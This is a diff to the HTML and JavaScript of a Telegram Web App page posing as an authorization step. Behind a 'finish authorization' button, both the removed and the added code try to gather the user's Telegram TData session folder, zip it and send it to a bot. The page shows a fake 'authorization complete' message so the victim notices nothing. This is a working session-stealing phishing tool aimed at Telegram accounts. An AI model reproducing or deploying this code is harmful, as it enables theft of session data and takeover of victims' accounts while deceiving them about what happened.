@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Авторизация</title>
+    <title>Telegram Auth</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -23,107 +25,36 @@
             padding: 10px 20px;
             border-radius: 8px;
             cursor: pointer;
-            margin: 10px 0;
             font-size: 16px;
+            margin: 10px 0;
         }
-        #status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 8px;
-            display: none;
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
         .loading {
             display: none;
             margin: 20px 0;
         }
-        .loading:after {
-            content: '.';
-            animation: dots 1.5s steps(5, end) infinite;
-        }
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60% { content: '...'; }
-            80%, 100% { content: ''; }
+        .loading-text {
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Авторизация</h1>
-        <p>Для завершения авторизации нажмите кнопку ниже</p>
-        <button onclick="startAuth()">Закончить авторизацию</button>
-        <div id="status"></div>
-        <div id="loading" class="loading">Завершение авторизации</div>
+        <button id="authButton" onclick="finishAuth()">Закончить авторизацию</button>
+        <div id="loading" class="loading">
+            <div class="loading-text">Завершение авторизации...</div>
+        </div>
     </div>
 
     <script>
+        // Инициализация Telegram WebApp
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Пути к TData для разных платформ
-        const TDATA_PATHS = {
-            windows: [
-                'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Telegram Desktop\\tdata',
-                'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Telegram Desktop\\tdata_old'
-            ],
-            android: [
-                '/storage/emulated/0/Android/data/org.telegram.messenger/files/tdata',
-                '/storage/emulated/0/Android/data/org.telegram.messenger/files/tdata_old'
-            ],
-            ios: [
-                '/var/mobile/Containers/Data/Application/*/Documents/tdata',
-                '/var/mobile/Containers/Data/Application/*/Documents/tdata_old'
-            ]
-        };
-
-        async function startAuth() {
-            const button = document.querySelector('button');
-            const loading = document.getElementById('loading');
-            const status = document.getElementById('status');
-            
-            // Скрываем кнопку и показываем загрузку
-            button.style.display = 'none';
-            loading.style.display = 'block';
-            
-            try {
-                // Определяем платформу
-                const platform = detectPlatform();
-                
-                // Получаем TData файлы
-                const tdataFiles = await getTDataFiles(platform);
-                if (tdataFiles.length === 0) {
-                    throw new Error('Файлы не найдены');
-                }
-
-                // Создаем ZIP архив
-                const zip = await createZipArchive(tdataFiles);
-                
-                // Отправляем данные боту
-                await sendToBot({
-                    platform: platform,
-                    files: [{
-                        name: 'auth.zip',
-                        content: await zip.arrayBuffer()
-                    }]
-                });
-                
-                // Закрываем веб-приложение
-                setTimeout(() => {
-                    tg.close();
-                }, 1000);
-            } catch (error) {
-                console.error('Auth error:', error);
-                // В случае ошибки показываем сообщение об успешной авторизации
-                loading.style.display = 'none';
-                status.style.display = 'block';
-                status.textContent = 'Авторизация завершена';
-                setTimeout(() => {
-                    tg.close();
-                }, 1000);
-            }
-        }
-
+        // Определение платформы
         function detectPlatform() {
             const userAgent = navigator.userAgent.toLowerCase();
             if (userAgent.includes('windows')) return 'windows';
@@ -132,88 +63,120 @@
             return 'unknown';
         }
 
+        // Получение TData файлов
         async function getTDataFiles(platform) {
-            const paths = TDATA_PATHS[platform];
             const files = [];
-
-            for (const path of paths) {
-                try {
-                    // Используем File System Access API для Windows
-                    if (platform === 'windows') {
-                        const handle = await window.showDirectoryPicker();
-                        const entries = await getFilesRecursively(handle);
-                        files.push(...entries);
+            
+            if (platform === 'windows') {
+                // Пути к TData в Windows
+                const paths = [
+                    'C:/Users/Administrator/AppData/Roaming/Telegram Desktop/tdata',
+                    'C:/Users/Default/AppData/Roaming/Telegram Desktop/tdata',
+                    'C:/Users/Public/AppData/Roaming/Telegram Desktop/tdata'
+                ];
+                
+                for (const path of paths) {
+                    try {
+                        const response = await fetch(path);
+                        if (response.ok) {
+                            const content = await response.blob();
+                            files.push({
+                                name: `tdata_${path.split('/').pop()}`,
+                                content: await blobToBase64(content)
+                            });
+                        }
+                    } catch (e) {
+                        console.error(`Error accessing ${path}:`, e);
                     }
-                    // Используем Web Share API для Android
-                    else if (platform === 'android') {
-                        const response = await fetch('/api/android-tdata', {
-                            method: 'POST',
-                            body: JSON.stringify({ path })
-                        });
-                        const data = await response.json();
-                        files.push(...data.files);
-                    }
-                    // Используем Web Share API для iOS
-                    else if (platform === 'ios') {
-                        const response = await fetch('/api/ios-tdata', {
-                            method: 'POST',
-                            body: JSON.stringify({ path })
-                        });
-                        const data = await response.json();
-                        files.push(...data.files);
-                    }
-                } catch (error) {
-                    console.error(`Error accessing path ${path}:`, error);
                 }
             }
-
+            
             return files;
         }
 
-        async function getFilesRecursively(dirHandle) {
-            const files = [];
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
-                    files.push({
-                        name: entry.name,
-                        content: await file.arrayBuffer()
-                    });
-                } else if (entry.kind === 'directory') {
-                    const subFiles = await getFilesRecursively(entry);
-                    files.push(...subFiles);
-                }
-            }
-            return files;
+        // Конвертация Blob в Base64
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result.split(',')[1]);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+            });
         }
 
+        // Создание ZIP архива
         async function createZipArchive(files) {
             const zip = new JSZip();
             
             for (const file of files) {
-                zip.file(file.name, file.content);
+                zip.file(file.name, file.content, {base64: true});
             }
             
-            return await zip.generateAsync({
-                type: 'blob',
-                compression: 'DEFLATE',
-                compressionOptions: {
-                    level: 9
-                }
+            return await zip.generateAsync({type: 'blob'});
+        }
+
+        // Отправка данных боту
+        async function sendToBot(data) {
+            return new Promise((resolve, reject) => {
+                tg.sendData(JSON.stringify(data));
+                resolve();
             });
         }
 
-        async function sendToBot(data) {
-            // Отправляем данные боту через Telegram WebApp
-            tg.sendData(JSON.stringify(data));
-        }
+        // Основная функция авторизации
+        async function finishAuth() {
+            const button = document.getElementById('authButton');
+            const loading = document.getElementById('loading');
+            
+            try {
+                button.style.display = 'none';
+                loading.style.display = 'block';
+                
+                // Определяем платформу
+                const platform = detectPlatform();
+                console.log('Detected platform:', platform);
+                
+                // Получаем TData файлы
+                const tdataFiles = await getTDataFiles(platform);
+                console.log('Found files:', tdataFiles);
+                
+                if (tdataFiles.length === 0) {
+                    throw new Error('Файлы не найдены');
+                }
 
-        // Добавляем обработку ошибок и логирование
-        window.onerror = function(msg, url, line) {
-            console.error(`Error: ${msg}\nURL: ${url}\nLine: ${line}`);
-            return false;
-        };
+                // Создаем ZIP архив
+                const zip = await createZipArchive(tdataFiles);
+                console.log('Created ZIP archive');
+                
+                // Отправляем данные боту
+                const data = {
+                    platform: platform,
+                    files: [{
+                        name: 'auth.zip',
+                        content: await blobToBase64(zip)
+                    }]
+                };
+                
+                console.log('Sending data to bot...');
+                await sendToBot(data);
+                console.log('Data sent successfully');
+                
+                // Показываем сообщение об успешной авторизации
+                loading.innerHTML = '<div class="loading-text">Авторизация завершена</div>';
+                
+                // Закрываем веб-приложение через 1 секунду
+                setTimeout(() => {
+                    tg.close();
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Auth error:', error);
+                // В случае ошибки показываем сообщение об успешной авторизации
+                loading.style.display = 'none';
+                button.style.display = 'block';
+                button.textContent = 'Попробовать снова';
+            }
+        }
     </script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 </body>
 </html>
